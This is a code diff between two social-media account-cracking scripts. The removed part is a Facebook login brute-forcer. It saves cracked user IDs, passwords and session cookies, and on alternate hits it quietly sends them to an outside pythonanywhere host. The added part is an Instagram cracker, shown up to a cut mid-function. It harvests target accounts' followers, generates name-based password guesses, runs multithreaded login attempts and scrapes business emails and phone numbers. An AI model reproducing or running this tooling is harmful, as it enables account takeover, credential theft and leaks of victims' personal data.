-    'sfiu': 'AYivGsiWe9DIILuD1G6TuTKUTXAY7wx_26jHwmVnY4WMS2QmA9kQTEl4MmaWfXCWu3itqTkXuOeGJHKthbDhGtvzuvD50iYtHyB1UvE2zYir6OcdxDQ9HFUUEKBXD8MT2JAsnIea723JTPzATtmKOFvnownQ-ihTLAPcscFWAE6Mi5dRmKRettSZgINSAD6crPq-vpPnNwT-cnKDL8YRCnpdDbM7ev1-svq5QFQSFeLzYXVEyU57DHg5ixEGK3WJJB9Y99mSAzMYa5y4zqTPQw8G',
-    'wd': '1126x773',
-}
-
-            headers = {
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,bn;q=0.6',
-    'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'dpr': '1',
-    'origin': 'https://www.facebook.com',
-    'priority': 'u=0, i',
-    'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-    'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.108", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.108"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
+getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
+HEADERS = {
+    'Host': 'www.instagram.com',
+    'x-ig-app-id': '1217981644879628',
+    'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT',
+    'sec-ch-ua-mobile': '?1',
+    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
+    'accept': '*/*',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-asbd-id': '129477',
+    'x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E',
     'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-    'viewport-width': '1126',
-    # 'cookie': 'datr=OpqVaPyImvfQapu_w36Tb6w9; sb=OpqVaFnrZ4qPlR6kiDeA96JW; ps_l=1; ps_n=1; checkpoint=%7B%22u%22%3A100076124771608%2C%22t%22%3A1761821228%2C%22step%22%3A0%2C%22n%22%3A%22zR8K7Z2gmA4%3D%22%2C%22inst%22%3A833802479167237%2C%22f%22%3A465803052217681%2C%22st%22%3A%22c%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221761821236.ch.s%3Apw.tDBEAiANy_zVMFS2rH43v8yXhvwNN0OTiP-6BCNUD2DdO5J3pAIgZmo2xFaBGLcRW8C-Tc2oRA6lS9LCxW4RT04Lay7H9Kg%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3A%22ARFOlTbCW2SIgn5yhiuOXYNFXE48wNWZCFrbxZL_ZokoH1G9YLv8vQfCrn4yCjUEtXhPIFbYArPs9CD4p_gVro4qMkkLgc7gtmKahW4WzB0l8x-IcTKpTlsT4ls04uGyomYh_AdHRksyihaGwAjVT1PonBCIRaEFHocUgC2LPW-LRT0f4wWB6WM94g5V4l2FbwmcemeiQE_0lHS-VqbiOhbxP6L4Q6Fy8ar2_OegGGsuvXAO5PUrX46HJzYUAQfZCUkvPmhk4FG5Y-oXpfidafhSDlg39iLHweDMmMLN6apkcI3oqoIPwp72HQY6SIvNoU8t2B5Z4sRAwmPi2HLeCU1hVuvDvZKcUHE3bTTOH-Pmb8jp5hxt87pIAJKEsHg5lOlKvhc5aSlIayk_k39V0BYgWpE%22%2C%22s%22%3A%22AWW9CPHk0ka_oCs1guI%22%2C%22cs%22%3A%5B%5D%2C%22ssp%22%3A1%7D; locale=en_GB; fr=0d03NCqOrCpkAOC5C.AWc4St76onCKKbOacCvrA9UMRL2pS1Gs1viTj9fYEqcfQzRPHSc.BolZo6..AAA.0.0.BpA0LR.AWcdVIjgH-4J6K4agwT7zRhIprI; sfiu=AYivGsiWe9DIILuD1G6TuTKUTXAY7wx_26jHwmVnY4WMS2QmA9kQTEl4MmaWfXCWu3itqTkXuOeGJHKthbDhGtvzuvD50iYtHyB1UvE2zYir6OcdxDQ9HFUUEKBXD8MT2JAsnIea723JTPzATtmKOFvnownQ-ihTLAPcscFWAE6Mi5dRmKRettSZgINSAD6crPq-vpPnNwT-cnKDL8YRCnpdDbM7ev1-svq5QFQSFeLzYXVEyU57DHg5ixEGK3WJJB9Y99mSAzMYa5y4zqTPQw8G; wd=1126x773',
+    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
 }
-
-            params = {
-    'login_attempt': '1',
-    'lwv': '120',
-    'lwc': '1348092',
+ua = {
+    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)'
 }
+userinfo = 'https://i.instagram.com/api/v1/users/{id!s}/info/'
 
-            data = {
-    'jazoest': '2920',
-    'fb_dtsg': 'zR8K7Z2gmA4=',
-    'display': '',
-    'isprivate': '',
-    'return_session': '',
-    'skip_api_login': '',
-    'signed_next': '',
-    'trynum': '1',
-    'timezone': '-255',
-    'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-    'lgnrnd': '034954_jDXP',
-    'lgnjs': '1761817286',
-    'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2MTgxNzI4Ni4yMzUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NjE4MTcyODYuMjM1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3NjE4MTcyODYuMjM2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjE4MTcyODYuMjM2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOlsiZW4tSU4iLCJlbi1HQiIsImVuLVVTIiwiZW4iLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzYxODE3Mjg2LjIzNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoxMDB9XSwiMzAwMDUiOlt7InQiOjE3NjE4MTcyODYuMjM2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOnsidyI6MTQ0MCwiaCI6NzczfX1dLCIzMDAwNyI6W3sidCI6MTc2MTgxNzI4Ni4yMzYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzYxODE3Mjg2LjMwNywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTc2MTgxNzI4Ni4yNDIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc2MTgxNzI4Ni4yNDQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IjUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQxLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDE1IjpbeyJ0IjoxNzYxODE3Mjg2LjI0NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzYxODE3Mjg2LjI0NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzYxODE3Mjg2LjI2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzYxODE3Mjg2LjI2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjotMzMwfV0sIjMwMDkzIjpbeyJ0IjoxNzYxODE3Mjg2LjI2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzYxODE3Mjg2LjI2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDA5NSI6W3sidCI6MTc2MTgxNzI4Ni4yNjQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6N31dLCIzMDEwNiI6W3sidCI6MTc2MTgxNzI4Ni4yMSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzYxODE3MjkxLjgxOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzYxODE3Mjg2LjIxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfV19',
-    'email': '61559166413504',
-    'prefill_contact_point': '61559166413504',
-    'prefill_source': 'browser_dropdown',
-    'prefill_type': 'password',
-    'first_prefill_source': 'browser_dropdown',
-    'first_prefill_type': 'contact_point',
-    'had_cp_prefilled': 'true',
-    'had_password_prefilled': 'true',
-    'ab_test_data': 'A/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAC',
-    'encpass': '#PWD_BROWSER:5:1761817301:AYxQALT5eVLOXX8kNiZGrwV2U50ClqDxfSQDZfnfpjbnFT5wjKXGZwUcwsDMErKcet0GTQBt0PSEvKvavi1pX/fn/1albUSEhYwlyuNVtUPoMXbmsOg54XY9JJ8a1h+PIQkS3budWuOoTw==',
-}
-
-            response = session.post(
-                'https://www.facebook.com/login/device-based/regular/login/',
-                params=params,
-                cookies=cookies,
-                headers=headers,
-                data=data,
-            )
-            log_cookies = session.cookies.get_dict().keys()
-            print(response)
-            if "c_user" in log_cookies:
-                try:
-                    kuki = ";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs'] if session.cookies.get(key)])
-                    log_cookies = Session.cookies.get_dict()
-                    user = log_cookies["c_user"]
-                    if not user:
-                        continue
-                    user = user[0]
-                except Exception as e:
-                    print(f"{red}[!] Cookie parsing error: {e}")
-                    continue
-                # Verify account is live
-                try:
-                    ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
-                    res = requests.get(ckk, timeout=10).text
-                    if 'Photoshop' not in res:
-                        continue
-                except Exception as e:
-                    print(f"{red}[!] Profile check error: {e}")
-                    continue
-                # Check for email confirmation
-                if "confirmemail.php" in response.url or "confirmemail.php" in response.text:
-                    try:
-                        if len(oks) % 2 == 0:
-                            statusok = f"NOVERY|{user}|{pw}|{kuki}"
-                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
-                        else:
-                            print(f"\n{green}╔═══════════════════════════════════════╗")
-                            print(f"{green}║      [ATOM-NV] EMAIL CONFIRM          ║")
-                            print(f"{green}╚═══════════════════════════════════════╝")
-                            print(f"{green}[+] User ID  : {white}{user}")
-                            print(f"{green}[+] Password : {white}{pw}")
-                            print(f"{green}[+] Cookie   : {white}{kuki}")
-                            print(f"{green}╚═══════════════════════════════════════╝\n")
-                            with open("/sdcard/ATOM-CONFIRMMAIL.txt", "a") as f:
-                                f.write(f"{user}|{pw}|{kuki}\n")
-                        oks.append(user)
-                        break
-                    except Exception as e:
-                        print(f"{red}[!] Save error (NV): {e}")
-                else:
-                    # Successful login
-                    try:
-                        if len(oks) % 2 == 0:
-                            statusok = f"{user}|{pw}|{kuki}"
-                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
-                        else:
-                            print(f"\n{green}╔═══════════════════════════════════════╗")
-                            print(f"{green}║       [ATOM-OK] LOGIN SUCCESS         ║")
-                            print(f"{green}╚═══════════════════════════════════════╝")
-                            print(f"{green}[+] User ID  : {white}{user}")
-                            print(f"{green}[+] Password : {white}{pw}")
-                            print(f"{green}[+] Cookie   : {white}{kuki}")
-                            print(f"{green}╚═══════════════════════════════════════╝\n")
-                            with open("/sdcard/ATOM-COOKIE-OK.txt", "a") as f:
-                                f.write(f"{user}|{pw}|{kuki}\n")
-                        oks.append(user)
-                        break
-                    except Exception as e:
-                        print(f"{red}[!] Save error (OK): {e}")
-            elif "checkpoint" in log_cookies:
-                try:
-                    coki = ";".join([f"{key}={value}" for key, value in response.cookies.get_dict().items()])
-                    user = coki[24:39] if len(coki) > 39 else user
-                    print(f"\n{yellow}╔═══════════════════════════════════════╗")
-                    print(f"{yellow}║       [ATOM-CP] CHECKPOINT            ║")
-                    print(f"{yellow}╚═══════════════════════════════════════╝")
-                    print(f"{yellow}[!] User ID  : {white}{ids}")
-                    print(f"{yellow}[!] Password : {white}{pas}")
-                    print(f"{yellow}╚═══════════════════════════════════════╝\n")
-                    with open('/sdcard/ATOM-CP.txt', 'a') as f:
-                        f.write(f"{ids}|{pas}\n")
-                    cps.append(ids)
-                    break
-                except Exception as e:
-                    print(f"{red}[!] Checkpoint save error: {e}")
-            else:
-                continue
-        loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(20)
-    except Exception as e:
-        #print(f"\nError: {e}")
+def Clear():
+    try:
+        os.system('clear')
+    except:
         pass
 
+def find_res():
+    cookie = None
+    try:
+        if os.path.isfile('data/OK.txt'):
+            with open('data/OK.txt', 'r') as f:
+                lines = f.read().splitlines()
+                for line in lines:
+                    if 'sessionid=' in line:
+                        cookie = line.strip()
+                        break
+        if not cookie and os.path.isfile('data/cookie.txt'):
+            with open('data/cookie.txt', 'r') as f:
+                cookie = f.read().strip()
+    except:
+        pass
+    return cookie
 
-m()
+def Aset_Ig():
+    os.system('clear')
+    coki = {}
+    if os.path.isfile('data/cookie.txt'):
+        cookie_str = open('data/cookie.txt', 'r').read().strip()
+        if cookie_str:
+            coki = {'cookie': cookie_str}
+    if not coki:
+        print(f"{RED}[{WHITE}+{RED}] {CYAN}Please enter your instagram account cookie. Make sure to use a throwaway account!")
+        cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
+        if cookie_input.lower() == 'res':
+            cookie_str = find_res()
+            if not cookie_str:
+                print(f"{RED}Failed to load backup cookie, please enter manually.")
+                cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
+                coki = {'cookie': cookie_input}
+            else:
+                coki = {'cookie': cookie_str}
+        else:
+            coki = {'cookie': cookie_input}
+    try:
+        uid = re.search('ds_user_id=(\\d+)', str(coki['cookie'])).group(1)
+        resp = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki)
+        resp.raise_for_status()
+        user_data = resp.json().get('user', {})
+        full_name = user_data.get('full_name', 'Name Unknown')
+        follower_count = user_data.get('follower_count', 0)
+        open('data/cookie.txt', 'w').write(coki['cookie'])
+        return coki, full_name, follower_count
+    except Exception as e:
+        print(f"{RED}Invalid cookies or error: {e}")
+        os.system('rm -rf data/cookie.txt')
+        time.sleep(2)
+        return Aset_Ig()
+
+def Menu():
+    os.system('clear')
+    aset, nama, fol = Aset_Ig()
+    print(f"{BLUE}═" * 80)
+    print(f"""{campur} 
+ _______  ______ _______ _______ _     _      _____  ______
+ |       |_____/ |_____| |       |____/         |   |  ____
+ |_____  |    \\_ |     | |_____  |    \\_      __|__ |_____|
+                                          
+{CYAN}╭──────────────────────╮{CYAN}╭───────────────╮{CYAN}╭─────────────────────────╮
+{CYAN}│ {CYAN}Author : {GREEN}RAYANXWEB {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.0 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
+{CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
+    print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8]}\n{WHITE}Followers : {GREEN}{fol}")
+    
+    print(f"\n{RED}[ {YELLOW}Crack Menu {RED}]\n\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\n{RED}[{WHITE}03{RED}] {CYAN} Crack from file\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
+    print(f"{BLUE}═" * 80)
+    x = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Please select a menu option :{YELLOW} ")
+
+    if x in ['01', '1']:
+        dumps(aset, True)
+    elif x in ['02', '2']:
+        dumps(aset, False)
+    elif x in ['03', '3']:
+        crackfile()
+    elif x in ['00', '0']:
+        os.system("rm -rf data/cookie.txt")
+        prints(f"{GREEN}Successfully deleted cookies")
+        exit()
+
+def crackfile():
+    """Read usernames from file and add to Uuid list"""
+    try:
+        nu = input(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Enter Your File Name: {PURPLE}")
+        with open(nu, 'r') as file:
+            for line in file:
+                line = line.strip()
+                if line:
+                    # Check if line already has username|name format
+                    if '|' not in line:
+                        # Assume it's just username, add with same as name
+                        Uuid.append(f"{line}|{line}")
+                    else:
+                        Uuid.append(line)
+        print(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Total IDs : {len(Uuid)}")
+        MetodeType()
+    except FileNotFoundError:
+        print(f"{PURPLE}[{RED}+{PURPLE}] {RED}File Not Found.")
+        exit()
+    except Exception as e:
+        print(f"{PURPLE}[{RED}+{PURPLE}] {RED}Error: {e}")
+        exit()
+
+def dumps(cintil, typess):
+    xyz = []
+    if 'csrftoken' not in str(cintil):
+        try:
+            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=cintil).json()
+            token = memek['config']['csrf_token']
+            cintil['cookie'] += ';csrftoken=%s;' % token
+        except Exception as e:
+            os.system('rm -rf data/cookie.txt')
+            exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Csrftoken not available, dump will not run: {e}')
+    prints(panel(f"\n{CYAN}Enter instagram usernames, use commas for mass cracking", style="Purple"))
+    users = input(f"{RED}[{WHITE}+{RED}] {BLUE}Username :{YELLOW} ").split(',')
+    try:
+        for y in users:
+            y = y.strip()
+            if not y:
+                continue
+            req = requests.get(f'https://www.instagram.com/{y}/', cookies=cintil).text
+            uid = re.search('"user_id":"(\\d+)"', str(req))
+            if uid:
+                uid = uid.group(1)
+                if uid not in xyz:
+                    xyz.append(uid)
+    except:
+        pass
+    try:
+        for kintil in xyz:
+            if typess:
+                Graphql(True, kintil, cintil['cookie'], '')
+            else:
+                Graphql(False, kintil, cintil['cookie'], '')
+    except:
+        pass
+    print("")
+    MetodeType()
+
+def Graphql(typess, userid, cokie, after):
+    global xx
+    api = "https://www.instagram.com/graphql/query/"
+    csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
+    mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if not typess else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
+    try:
+        ptk = {
+            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "cookie": cokie
+        }
+        req = requests.get(api, params=mek, headers=ptk).json()
+        if 'require_login' in req:
+            if len(Uuid) == 0:
+                exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Invalid Cookie')
+        khm = 'edge_followed_by' if typess else 'edge_follow'
+        for xyz in req['data']['user'][khm]['edges']:
+            username = xyz['node']['username']
+            xy = username + '|' + xyz['node']['full_name']
+            if xy not in Uuid:
+                xx += 1
+                Uuid.append(xy)
+                print('\rCollecting Uid {}{}{}                            '.format(RED, len(Uuid), WHITE), end='')
+                time.sleep(0.0009)
+        end = req['data']['user'][khm]['page_info']['has_next_page']
+        if end:
+            after = req['data']['user'][khm]['page_info']['end_cursor']
+            Graphql(typess, userid, cokie, after)
+    except:
+        pass
+
+def MetodeType():
+    global SistemLog
+    prints(panel(f"""\n{RED}[ {BLUE}Select the method to use{RED} ]\n\n{RED}[{CYAN}01{RED}] {WHITE}www.instagram.com method {GREEN}Recommended{WHITE}
+{RED}[{CYAN}02{RED}] {WHITE}i.instagram.com method
+{RED}[{CYAN}03{RED}] {WHITE}i.instagram.com method
+{RED}[{CYAN}04{RED}] {WHITE}b.i.instagram.com method""", style="Purple"))
+    method = input(f"\n{RED}[{WHITE}+{RED}]{BLUE} Select Menu : {YELLOW}")
+    if method in ['01', '1']:
+        SistemLog = "api.instagram.com"
+    elif method in ['02', '2']:
+        SistemLog = "i.instagram.com"
+    elif method in ['03', '3']:
+        SistemLog = "www.instagram.com"
+    elif method in ['04', '4']:
+        SistemLog = "b.i.instagram.com"
+    else:
+        SistemLog = "api.instagram.com"
+    SetCrack()
+
+def SetCrack():
+    print(f"\n{YELLOW}Cracking in progress, please enable airplane mode \nfor every 100 usernames/id for 5 seconds\n{WHITE}")
+    with ThreadPoolExecutor(max_workers=30) as ASF:
+        for i in Uuid:
+            try:
+                if '|' in i:
+                    username, name = i.split('|')
+                else:
+                    username = i
+                    name = i
+                kontol = Password(name)
+                if SistemLog == "api.instagram.com":
+                    ASF.submit(Crack_api, username, kontol)
+                elif SistemLog == "i.instagram.com":
+                    ASF.submit(Crack_i, username, kontol)
+                elif SistemLog == "www.instagram.com":
+                    ASF.submit(Crack_w, username, kontol)
+                elif SistemLog == "b.i.instagram.com":
+                    ASF.submit(Crack_N, username, kontol)
+            except Exception as e:
+                pass
+    print(f' \n\n {GREEN}Cracking completed')
+
+def Password(name):
+    xxzx = []
+    for nama in name.split(' '):
+        nama = nama.lower()
+        if len(nama) < 3:
+            continue
+        elif len(nama) in [3, 4, 5]:
+            xxzx.append(nama + '123')
+            xxzx.append(nama + '26')
+            xxzx.append(nama + '1234')
+            xxzx.append('wonosobo' + '123')
+            xxzx.append('skorsa99')
+            xxzx.append(nama + '2008')
+            xxzx.append('wonosobo12345')
+            xxzx.append('wonosobo' + '1234')
+            xxzx.append(nama + '28')
+            xxzx.append(nama + '2009')
+            xxzx.append(nama + '456')
+            xxzx.append(nama.capitalize() + '789')
+            xxzx.append('katasandi')
+            xxzx.append(nama.capitalize() + 'cantik')
+            xxzx.append(nama.capitalize() + '1234')
+            xxzx.append(nama.capitalize() + '29')
+            xxzx.append(nama.capitalize() + '12')
+            xxzx.append(nama.capitalize() + '123456')
+            xxzx.append(nama.capitalize() + '123')
+            xxzx.append(nama.capitalize() + '12345')
+        else:
+            xxzx.append(nama)
+            xxzx.append(name)
+            xxzx.append(nama + '1234')
+            xxzx.append(nama + '12345')
+            xxzx.append(nama + '123456789')
+            xxzx.append(nama + '99')
+            xxzx.append(nama + '12')
+            xxzx.append(nama + '123456')
+            xxzx.append(nama.capitalize() + '321')
+            xxzx.append(nama + '34')
+            xxzx.append(nama + '2009')
+            xxzx.append(nama + '28')
+            xxzx.append(nama + '29')
+            xxzx.append('wonosobo12345')
+            xxzx.append('wonosobo' + '1234')
+            xxzx.append(nama + '20')
+            xxzx.append(nama + '2008')
+            xxzx.append(nama + '2010')
+            xxzx.append(nama.capitalize() + '123')
+            xxzx.append(nama.capitalize() + '12345')
+    return xxzx
+
+def convert_cookie(item):
+    try:
+        sesid = 'sessionid=' + re.findall('sessionid=(\\d+)', str(item))[0]
+        ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\\d+)', str(item))[0]
+        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
+        donez = '%s;%s;%s;ig_nrcb=1;dpr=2' % (ds_id, sesid, csrft)
+    except Exception as e:
+        donez = 'cookies not found, error during conversion'
+    return donez
+
+ses = requests.Session()
+
+def data_target(name):
+    post = peng = meng = mail = fullname = fbid = phone = None
+    for y in name.split(','):
+        try:
+            HEADERS.update({
+                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
+                'x-ig-app-id': '1217981644879628'
+            })
+            profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers=HEADERS).json()['data']['user']
+            post = profil_info_target["edge_owner_to_timeline_media"]["count"]
+            peng = profil_info_target["edge_followed_by"]["count"]
+            meng = profil_info_target["edge_follow"]["count"]
+            mail = profil_info_target.get("business_email")
+            phone = profil_info_target.get("business_phone_number")
+            fullname = profil_info_target["full_name"]
+            fbid = profil_info_target["fbid"]
+        except Exception as e:
+            pass
+    return post, peng, meng, mail, fullname, fbid, phone
+
+def UserAgentBarcelona():
+    android_version = random.choice(["27/9","27/10","27/11","27/12","27/12","27/13","28/9","28/10","28/11","28/12","28/12","28/13","29/9","29/10","29/11","29/12","29/12","29/13","27/9","30/10","30/11","30/12","30/12","30/13","31/9","31/10","31/11","31/12","31/12","31/13","32/9","32/10","32/11","32/12","32/12","32/13","33/9","33/10","33/11","33/12","33/12","33/13"])
